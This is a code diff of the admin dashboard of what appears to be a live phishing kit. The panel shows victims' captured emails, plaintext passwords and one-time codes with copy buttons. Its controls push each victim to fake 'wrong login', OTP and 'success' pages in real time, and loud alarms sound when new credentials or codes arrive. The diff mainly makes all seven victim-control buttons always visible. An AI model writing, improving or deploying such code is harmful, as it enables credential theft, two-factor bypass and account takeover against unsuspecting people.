@@ -55,7 +55,7 @@ body { background: var(--bg); min-height: 100vh; color: var(--text); transition:
 .stat-card h3 { font-size: 12px; color: var(--text-secondary); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
 .stat-card .num { font-size: 28px; font-weight: 700; color: var(--text); }
 .table-wrap { background: var(--card); border-radius: 20px; overflow-x: auto; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
-table { width: 100%; border-collapse: collapse; min-width: 1200px; }
+table { width: 100%; border-collapse: collapse; min-width: 1400px; }
 th {
   text-align: left; padding: 14px 16px; background: var(--table-header);
   font-size: 12px; color: var(--text-secondary); font-weight: 600;
@@ -68,9 +68,9 @@ tr:hover { background: var(--hover); }
 .badge-approved { background: #d1fae5; color: #059669; }
 .badge-otp { background: #e0e7ff; color: #4f46e5; }
 .badge-success { background: #d1fae5; color: #059669; }
-.actions { display: flex; flex-wrap: wrap; gap: 6px; }
+.actions { display: flex; flex-wrap: wrap; gap: 6px; max-width: 500px; }
 .btn {
-  padding: 6px 12px; border-radius: 8px; border: none;
+  padding: 6px 10px; border-radius: 8px; border: none;
   cursor: pointer; font-size: 11px; font-weight: 600; white-space: nowrap;
 }
 .btn:hover { opacity: 0.85; }
@@ -83,15 +83,12 @@ tr:hover { background: var(--hover); }
 .btn-wrong-otp { background: #e11d48; color: white; }
 .btn-copy { background: var(--border); color: var(--text); padding: 4px 8px; font-size: 10px; border-radius: 6px; border: none; cursor: pointer; margin-left: 6px; }
 
-/* TOAST */
 #toast {
   position: fixed; top: 80px; left: 50%; transform: translateX(-50%);
   padding: 14px 24px; border-radius: 12px; color: white;
   font-weight: 600; font-size: 14px; z-index: 20000;
   display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-  animation: slideDown 0.3s ease;
 }
-@keyframes slideDown { from { opacity: 0; transform: translate(-50%, -20px); } to { opacity: 1; transform: translate(-50%, 0); } }
 #toast.success { background: #10b981; }
 #toast.error { background: #ef4444; }
 
@@ -189,91 +186,74 @@ let selectedEmailForText = null;
 let audioCtx = null;
 let soundEnabled = false;
 
-// ============ DARK MODE ============
+// DARK MODE
 const themeBtn = document.getElementById('themeBtn');
 const savedTheme = localStorage.getItem('atlas_theme') || 'light';
 document.documentElement.setAttribute('data-theme', savedTheme);
 themeBtn.textContent = savedTheme === 'dark' ? '☀️ Light' : '🌙 Dark';
-
 themeBtn.addEventListener('click', () => {
-  const current = document.documentElement.getAttribute('data-theme');
-  const next = current === 'dark' ? 'light' : 'dark';
+  const cur = document.documentElement.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
   document.documentElement.setAttribute('data-theme', next);
   localStorage.setItem('atlas_theme', next);
   themeBtn.textContent = next === 'dark' ? '☀️ Light' : '🌙 Dark';
 });
 
-// ============ LOUD WEB AUDIO TONES ============
+// LOUD TONES
 function getAudioCtx() {
   if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   if (audioCtx.state === 'suspended') audioCtx.resume();
   return audioCtx;
 }
-
-function playTone(frequencies, durations, volume = 0.9) {
+function playTone(freqs, durs, vol = 0.9) {
   if (!soundEnabled) return;
   try {
     const ctx = getAudioCtx();
-    let time = ctx.currentTime;
-    frequencies.forEach((freq, i) => {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.type = 'square';  // harsher = louder perception
-      osc.frequency.value = freq;
-      gain.gain.setValueAtTime(0.001, time);
-      gain.gain.linearRampToValueAtTime(volume, time + 0.01);
-      gain.gain.linearRampToValueAtTime(0.001, time + durations[i]);
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start(time);
-      osc.stop(time + durations[i]);
-      time += durations[i];
+    let t = ctx.currentTime;
+    freqs.forEach((f, i) => {
+      const o = ctx.createOscillator();
+      const g = ctx.createGain();
+      o.type = 'square';
+      o.frequency.value = f;
+      g.gain.setValueAtTime(0.001, t);
+      g.gain.linearRampToValueAtTime(vol, t + 0.01);
+      g.gain.linearRampToValueAtTime(0.001, t + durs[i]);
+      o.connect(g); g.connect(ctx.destination);
+      o.start(t); o.stop(t + durs[i]);
+      t += durs[i];
     });
-  } catch (e) { console.log('Audio error:', e); }
+  } catch(e) { console.log(e); }
 }
-
 function playEmailTone() {
-  // Loud urgent alarm — repeat twice
   playTone([1200, 1500, 1200, 1500], [0.12, 0.12, 0.12, 0.12], 0.9);
   setTimeout(() => playTone([1200, 1500, 1200, 1500], [0.12, 0.12, 0.12, 0.12], 0.9), 600);
 }
-
 function playOtpTone() {
-  // Very different, higher urgency pattern
   playTone([1000, 1300, 1600, 1000, 1300, 1600], [0.1, 0.1, 0.1, 0.1, 0.1, 0.15], 0.9);
   setTimeout(() => playTone([1000, 1300, 1600], [0.1, 0.1, 0.15], 0.9), 800);
 }
 
-// ============ TOAST ============
+document.getElementById('soundBtn').addEventListener('click', () => {
+  soundEnabled = !soundEnabled;
+  const b = document.getElementById('soundBtn');
+  if (soundEnabled) { b.classList.remove('off'); b.textContent = '🔊 Sound On'; playEmailTone(); }
+  else { b.classList.add('off'); b.textContent = '🔇 Sound Off'; }
+});
+
+// TOAST
 function showToast(msg, type = 'success') {
   const t = document.getElementById('toast');
   t.textContent = msg;
   t.className = type;
   t.style.display = 'block';
-  clearTimeout(window.toastTimer);
-  window.toastTimer = setTimeout(() => { t.style.display = 'none'; }, 3000);
+  clearTimeout(window.toastT);
+  window.toastT = setTimeout(() => { t.style.display = 'none'; }, 3000);
 }
 
-// ============ SOUND TOGGLE ============
-document.getElementById('soundBtn').addEventListener('click', () => {
-  soundEnabled = !soundEnabled;
-  const btn = document.getElementById('soundBtn');
-  if (soundEnabled) {
-    btn.classList.remove('off');
-    btn.textContent = '🔊 Sound On';
-    playEmailTone();
-  } else {
-    btn.classList.add('off');
-    btn.textContent = '🔇 Sound Off';
-  }
-});
-
-// ============ LOAD USERS ============
+// LOAD USERS
 async function loadUsers() {
   try {
-    const res = await fetch('/api/admin/users', {
-      headers: { 'Authorization': `Bearer ${token}` }
-    });
+    const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
     if (res.status === 401 || res.status === 403) {
       localStorage.removeItem('adminToken');
       window.location.href = '/admin';
@@ -284,7 +264,6 @@ async function loadUsers() {
     updateStats();
   } catch (e) { console.error(e); }
 }
-
 function updateStats() {
   document.getElementById('statTotal').textContent = users.length;
   document.getElementById('statPending').textContent = users.filter(u => u.status === 'pending').length;
@@ -292,6 +271,7 @@ function updateStats() {
   document.getElementById('statSuccess').textContent = users.filter(u => u.status === 'success').length;
 }
 
+// ============ ALL 7 BUTTONS ALWAYS VISIBLE ============
 function renderTable() {
   const tbody = document.getElementById('usersTable');
   if (!users.length) {
@@ -300,38 +280,30 @@ function renderTable() {
   }
 
   tbody.innerHTML = users.map(u => {
-    let statusBadge = '';
-    if (u.status === 'pending') statusBadge = '<span class="badge badge-pending">Pending</span>';
-    else if (u.status === 'approved') statusBadge = '<span class="badge badge-approved">Approved</span>';
-    else if (u.status === 'otp_submitted') statusBadge = '<span class="badge badge-otp">OTP Submitted</span>';
-    else if (u.status === 'success') statusBadge = '<span class="badge badge-success">Success</span>';
+    let badge = '';
+    if (u.status === 'pending') badge = '<span class="badge badge-pending">Pending</span>';
+    else if (u.status === 'approved') badge = '<span class="badge badge-approved">Approved</span>';
+    else if (u.status === 'otp_submitted') badge = '<span class="badge badge-otp">OTP Submitted</span>';
+    else if (u.status === 'success') badge = '<span class="badge badge-success">Success</span>';
 
-    let actions = '';
-    if (u.status === 'pending') {
-      actions = `
-        <button class="btn btn-wrong" onclick="wrongLogin('${u.email}')">Wrong Login</button>
-        <button class="btn btn-yes" onclick="openYes('${u.email}')">Yes</button>
-        <button class="btn btn-text" onclick="openText('${u.email}')">Text</button>
-        <button class="btn btn-timeout" onclick="timeoutUser('${u.email}')">Timeout</button>
-        <button class="btn btn-otp" onclick="sendToOtp('${u.email}')">Send to OTP</button>
-        <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
-      `;
-    } else if (u.status === 'otp_submitted' || u.status === 'approved') {
-      actions = `
-        <button class="btn btn-wrong-otp" onclick="wrongOtp('${u.email}')">Wrong OTP</button>
-        <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
-      `;
-    } else if (u.status === 'success') {
-      actions = '<span style="color:var(--text-secondary);font-size:12px;">Completed</span>';
-    }
+    // ⭐ ALL BUTTONS ALWAYS VISIBLE — no status filtering
+    const allButtons = `
+      <button class="btn btn-wrong" onclick="wrongLogin('${u.email}')">Wrong Login</button>
+      <button class="btn btn-yes" onclick="openYes('${u.email}')">Yes</button>
+      <button class="btn btn-text" onclick="openText('${u.email}')">Text</button>
+      <button class="btn btn-timeout" onclick="timeoutUser('${u.email}')">Timeout</button>
+      <button class="btn btn-otp" onclick="sendToOtp('${u.email}')">Send to OTP</button>
+      <button class="btn btn-wrong-otp" onclick="wrongOtp('${u.email}')">Wrong OTP</button>
+      <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
+    `;
 
     return `<tr>
       <td>${u.id}</td>
       <td>${escapeHtml(u.email)} <button class="btn-copy" onclick="copyText('${escapeHtml(u.email)}','Email')">Copy</button></td>
       <td>${escapeHtml(u.password || '-')} ${u.password ? `<button class="btn-copy" onclick="copyText('${escapeHtml(u.password)}','Password')">Copy</button>` : ''}</td>
       <td>${u.otp ? escapeHtml(u.otp) + ` <button class="btn-copy" onclick="copyText('${escapeHtml(u.otp)}','OTP')">Copy</button>` : '-'}</td>
-      <td>${statusBadge}</td>
-      <td><div class="actions">${actions}</div></td>
+      <td>${badge}</td>
+      <td><div class="actions">${allButtons}</div></td>
     </tr>`;
   }).join('');
 }
@@ -340,13 +312,12 @@ function escapeHtml(s) {
   if (!s) return '';
   return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
 }
-
 function copyText(text, label) {
   navigator.clipboard.writeText(text);
   showToast(`✅ ${label} copied`, 'success');
 }
 
-// ============ ACTIONS ============
+// ACTIONS
 async function post(path, body) {
   const res = await fetch(path, {
     method: 'POST',
@@ -359,8 +330,7 @@ async function post(path, body) {
 async function wrongLogin(email) {
   try {
     const r = await post('/api/admin/wrong-login', { email });
-    if (r.success) showToast('✅ Wrong Login sent to user', 'success');
-    else showToast('❌ Failed to send Wrong Login', 'error');
+    showToast(r.success ? '✅ Wrong Login sent' : '❌ Failed', r.success ? 'success' : 'error');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
 }
@@ -368,8 +338,7 @@ async function wrongLogin(email) {
 async function timeoutUser(email) {
   try {
     const r = await post('/api/admin/timeout', { email });
-    if (r.success) showToast('✅ Timeout sent to user', 'success');
-    else showToast('❌ Failed', 'error');
+    showToast(r.success ? '✅ Timeout sent' : '❌ Failed', r.success ? 'success' : 'error');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
 }
@@ -377,8 +346,7 @@ async function timeoutUser(email) {
 async function sendToOtp(email) {
   try {
     const r = await post('/api/admin/send-to-otp', { email });
-    if (r.success) showToast('✅ User redirected to OTP page', 'success');
-    else showToast('❌ Failed', 'error');
+    showToast(r.success ? '✅ User redirected to OTP' : '❌ Failed', r.success ? 'success' : 'error');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
 }
@@ -386,8 +354,7 @@ async function sendToOtp(email) {
 async function wrongOtp(email) {
   try {
     const r = await post('/api/admin/wrong-otp', { email });
-    if (r.success) showToast('✅ Wrong OTP signal sent', 'success');
-    else showToast('❌ Failed', 'error');
+    showToast(r.success ? '✅ Wrong OTP signal sent' : '❌ Failed', r.success ? 'success' : 'error');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
 }
@@ -395,8 +362,7 @@ async function wrongOtp(email) {
 async function markSuccess(email) {
   try {
     const r = await post('/api/admin/success', { email });
-    if (r.success) showToast('✅ User sent to Success page', 'success');
-    else showToast('❌ Failed', 'error');
+    showToast(r.success ? '✅ Success triggered' : '❌ Failed', r.success ? 'success' : 'error');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
 }
@@ -407,14 +373,12 @@ function openYes(email) {
   document.getElementById('yesModal').classList.add('active');
   setTimeout(() => document.getElementById('yesNumberInput').focus(), 100);
 }
-
 async function confirmYes() {
-  const num = document.getElementById('yesNumberInput').value.trim();
-  if (!num) { showToast('❌ Enter a number first', 'error'); return; }
+  const n = document.getElementById('yesNumberInput').value.trim();
+  if (!n) { showToast('❌ Enter a number', 'error'); return; }
   try {
-    const r = await post('/api/admin/yes', { email: selectedEmailForYes, number: num });
-    if (r.success) showToast(`✅ YES (${num}) sent to user`, 'success');
-    else showToast('❌ Failed', 'error');
+    const r = await post('/api/admin/yes', { email: selectedEmailForYes, number: n });
+    showToast(r.success ? `✅ YES (${n}) sent` : '❌ Failed', r.success ? 'success' : 'error');
     closeModal('yesModal');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
@@ -426,29 +390,21 @@ function openText(email) {
   document.getElementById('textModal').classList.add('active');
   setTimeout(() => document.getElementById('textInput').focus(), 100);
 }
-
 async function confirmText() {
-  const txt = document.getElementById('textInput').value.trim();
-  if (!txt) { showToast('❌ Enter a message first', 'error'); return; }
+  const t = document.getElementById('textInput').value.trim();
+  if (!t) { showToast('❌ Enter a message', 'error'); return; }
   try {
-    const r = await post('/api/admin/text', { email: selectedEmailForText, text: txt });
-    if (r.success) showToast('✅ Text message sent to user', 'success');
-    else showToast('❌ Failed', 'error');
+    const r = await post('/api/admin/text', { email: selectedEmailForText, text: t });
+    showToast(r.success ? '✅ Text sent' : '❌ Failed', r.success ? 'success' : 'error');
     closeModal('textModal');
     loadUsers();
   } catch (e) { showToast('❌ Network error', 'error'); }
 }
 
-function closeModal(id) {
-  document.getElementById(id).classList.remove('active');
-}
+function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+function logout() { localStorage.removeItem('adminToken'); window.location.href = '/admin'; }
 
-function logout() {
-  localStorage.removeItem('adminToken');
-  window.location.href = '/admin';
-}
-
-// ============ SOCKET EVENTS ============
+// SOCKET EVENTS — LOUD TONES
 socket.on('user-login', () => { playEmailTone(); loadUsers(); });
 socket.on('user-otp', () => { playOtpTone(); loadUsers(); });
 socket.on('user-updated', () => loadUsers());
